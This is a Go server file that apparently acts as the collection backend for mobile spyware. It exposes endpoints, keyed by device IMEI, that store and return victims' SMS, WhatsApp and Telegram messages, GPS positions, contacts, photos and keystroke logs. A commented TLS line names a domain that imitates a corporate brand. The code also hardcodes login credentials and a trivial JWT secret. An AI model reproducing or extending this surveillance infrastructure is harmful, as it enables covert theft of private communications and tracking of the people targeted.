package main

import (
	"fmt"
	"net/http"
	
	swaggerFiles "github.com/swaggo/files"
	ginSwagger "github.com/swaggo/gin-swagger"
    
	"./config"
	"./controllers"
	jwt "github.com/dgrijalva/jwt-go"
	"github.com/gin-gonic/contrib/static"
	"github.com/gin-gonic/gin"
	_ "github.com/go-sql-driver/mysql"
	//"github.com/gin-gonic/autotls"
)

type Credential struct {
	Username string `json:"username"`
	Password string `json:"password"`
}



func main() {
	db := config.DBInit()
	inDB := &controllers.InDB{DB: db}

	router := gin.Default()
	router.Use(static.Serve("/", static.LocalFile("./views", true)))

	api := router.Group("/api")
	{
		api.GET("/", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{
				"message": "pong",
			})
		})
	}
	//api.POST("/login", loginHandler)
	api.GET("/person/:id", auth, inDB.GetPerson)
	api.GET("/people", auth, inDB.GetPersons)
	api.POST("/person",  inDB.CreatePerson)

	api.POST("/message",authSame,inDB.CreateMessage)
	api.GET("/message",authSame,inDB.GetAllMessages)
	api.GET("/message/:id",authSame,inDB.GetMessage)
	api.GET("/message/:imei",authSame,inDB.GetMessageImei)
	
	api.POST("/whatsapp",authSame,inDB.CreateWhatsapp)
	api.GET("/whatsapp",authSame,inDB.GetAllWhatsapp)
	api.GET("/whatsapp/:id",authSame,inDB.GetWhatsapp)
	api.GET("/whatsapp/:imei",authSame,inDB.GetWhatsappImei)

	api.POST("/telegram",authSame,inDB.CreateTelegram)
	api.GET("/telegram",authSame,inDB.GetAllTelegram)
	api.GET("/telegram/:id",authSame,inDB.GetTelegram)
	api.GET("/telegram/:imei",authSame,inDB.GetTelegramImei)

	api.POST("/gps",authSame,inDB.CreateGPS)
	api.GET("/gps",authSame,inDB.GetAllGPS)
	api.GET("/gps/:id",authSame,inDB.GetGPS)
	api.GET("/gps/:imei",authSame,inDB.GetGPSImei)

	api.POST("/contact",authSame,inDB.CreateContact)
	api.GET("/contact",authSame,inDB.GetAllContact)
	api.GET("/contact/:id",authSame,inDB.GetContact)
	api.GET("/contact/:imei",authSame,inDB.GetContactImei)

	api.POST("/picture",authSame,inDB.SubmitPicture)
	api.GET("/picture",authSame,inDB.GetAllPicture)
	api.GET("/picture/:id",authSame,inDB.GetPicture)
	api.GET("/picture/:imei",authSame,inDB.GetPictureImei)

	api.POST("/key",authSame,inDB.CreateKeyLog)
	api.GET("/key",authSame,inDB.GetAllKeylog)
	api.GET("/key/:id",authSame,inDB.GetKeylog)
	api.GET("/key/:imei",authSame,inDB.GetKeylogImei)
	
	api.GET("/swagger/*any", ginSwagger.WrapHandler(swaggerFiles.Handler))
	//router.RunTLS(":3000", "/etc/letsencrypt/live/ios.id-successfactors.com/cert.pem", "/etc/letsencrypt/live/ios.id-successfactors.com/privkey.pem")
	router.Run(":3000")
}

func loginHandler(c *gin.Context) {
	var user Credential
	err := c.Bind(&user)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"status":  http.StatusBadRequest,
			"message": "can't bind struct",
		})
	}
	if user.Username != "myname" {
		c.JSON(http.StatusUnauthorized, gin.H{
			"status":  http.StatusUnauthorized,
			"message": "wrong username or password",
		})
	} else {
		if user.Password != "myname123" {
			c.JSON(http.StatusUnauthorized, gin.H{
				"status":  http.StatusUnauthorized,
				"message": "wrong username or password",
			})
		}
	}
	sign := jwt.New(jwt.GetSigningMethod("HS256"))
	token, err := sign.SignedString([]byte("secret"))
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"message": err.Error(),
		})
		c.Abort()
	}
	c.JSON(http.StatusOK, gin.H{
		"token": token,
	})
}

func auth(c *gin.Context) {
	tokenString := c.Request.Header.Get("Authorization")
	db := config.DBInit()
	inDB := &controllers.InDB{DB: db}
	result := inDB.GetAPI(tokenString)
	fmt.Printf("token:%v\n", result)
	token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
		if jwt.GetSigningMethod("HS256") != token.Method {
			return nil, fmt.Errorf("Unexpected signing method: %v", token.Header["alg"])
		}

		return []byte(result), nil
	})

	if token != nil && err == nil {
		fmt.Println("token verified")
	} else {
		result := gin.H{
			"message": "not authorized",
			"error":   err.Error(),
		}
		c.JSON(http.StatusUnauthorized, result)
		c.Abort()
	}
}

func authSame(c *gin.Context) {
	tokenString := c.Request.Header.Get("Authorization")
	db := config.DBInit()
	inDB := &controllers.InDB{DB: db}
	result := inDB.GetAPI(tokenString)
	imei := c.PostForm("imei")
	fmt.Printf("\ntoken:%v\n", result)
	token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
		if jwt.GetSigningMethod("HS256") != token.Method {
			return nil, fmt.Errorf("Unexpected signing method: %v", token.Header["alg"])
		}

		return []byte(result), nil
	})

	

	if token != nil && err == nil && result == imei {
		fmt.Println("token verified")
	} else {
		result := gin.H{
			"message": "not authorized",
			"error":   err.Error(),
		}
		c.JSON(http.StatusUnauthorized, result)
		c.Abort()
	}
}